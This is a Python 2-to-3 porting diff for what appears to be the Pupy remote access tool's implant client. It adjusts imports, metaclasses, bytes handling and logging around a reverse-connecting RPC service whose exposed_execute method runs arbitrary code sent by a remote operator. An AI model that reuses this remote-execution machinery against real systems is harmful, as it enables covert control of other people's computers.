@@ -34,6 +34,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 import sys
 
 import threading
@@ -50,11 +51,17 @@ from network.lib.streams.PupySocketStream import PupyChannel
 from network.lib.buffer import Buffer
 from network.lib.msgtypes import MSG_TYPES_PACK
 from network.lib.rpc.core.service import Service, ModuleNamespace
-from network.lib.compat import execute
+from network.lib.compat import execute, with_metaclass
 
 import umsgpack
 
 import pupy
+
+if sys.version_info.major > 2:
+    xrange = range
+    builtin = 'builtins'
+else:
+    builtin = '__builtin__'
 
 REVERSE_SLAVE_CONF = dict(
     allow_all_attrs=True,
@@ -79,14 +86,46 @@ def _import(name):
 
 
 class UpdatableModuleNamespace(ModuleNamespace):
-    __slots__ = (
-        '__invalidate__',
-    )
+    __slots__ = ()
 
     def __invalidate__(self, name):
         cache = self._ModuleNamespace__cache
         if name in cache:
             del cache[name]
+
+    def __getitem__(self, name):
+        return super(UpdatableModuleNamespace, self).__getitem__(name)
+
+    exposed___getitem__ = __getitem__
+
+    def __getattr__(self, name):
+        if name.startswith('___'):
+            if __debug__:
+                logger.debug('Access UpdatableModuleNamespace.%s - deny', name)
+
+            raise AttributeError(name)
+        elif name.startswith('exposed_'):
+            if __debug__:
+                logger.debug(
+                    'Access UpdatableModuleNamespace.%s - fix invalid exposed_', name
+                )
+
+            name = name[8:]
+
+        try:
+            result = super(UpdatableModuleNamespace, self).__getattr__(name)
+        except AttributeError:
+            if __debug__:
+                logger.debug(
+                    'Access UpdatableModuleNamespace.%s -> not found', name
+                )
+
+            raise
+
+        if __debug__:
+            logger.debug('Access UpdatableModuleNamespace.%s -> %s', name, result)
+
+        return result
 
 
 class ReverseSlaveService(Service):
@@ -117,7 +156,7 @@ class ReverseSlaveService(Service):
         self._conn.root.initialize_v1(
             self.exposed_namespace,
             pupy.namespace,
-            __import__('__builtin__'),
+            __import__(builtin),
             self.exposed_register_cleanup,
             self.exposed_unregister_cleanup,
             self.exposed_obtain_call,
@@ -183,7 +222,15 @@ class ReverseSlaveService(Service):
 
     def exposed_execute(self, text):
         """execute arbitrary code (using ``exec``)"""
-        execute(text, self.exposed_namespace)
+        try:
+            execute(text, self.exposed_namespace)
+        except Exception as e:
+            logger.debug(
+                'Execute failed: arg type=%s arg=%s: %s',
+                type(text), text, e
+            )
+
+            raise
 
     def exposed_get_infos(self, s=None):
         if not s:
@@ -253,7 +300,7 @@ class ReverseSlaveService(Service):
                 )
 
         if compressed:
-            if type(data) == unicode:
+            if not isinstance(data, bytes):
                 data = data.encode('utf-8')
 
             data = zlib.compress(data)
@@ -320,11 +367,13 @@ class PupyClient(object):
                 super(client_initializer, cls).__init__(*args, **kwargs)
                 cls.client = self
 
-        class WrappedBindSlaveService(BindSlaveService):
-            __metaclass__ = client_initializer
+        class WrappedBindSlaveService(
+                with_metaclass(client_initializer, BindSlaveService)):
+            pass
 
-        class WrappedReverseSlaveService(ReverseSlaveService):
-            __metaclass__ = client_initializer
+        class WrappedReverseSlaveService(
+                with_metaclass(client_initializer, ReverseSlaveService)):
+            pass
 
         self._bind_service = WrappedBindSlaveService
         self._connect_service = WrappedReverseSlaveService
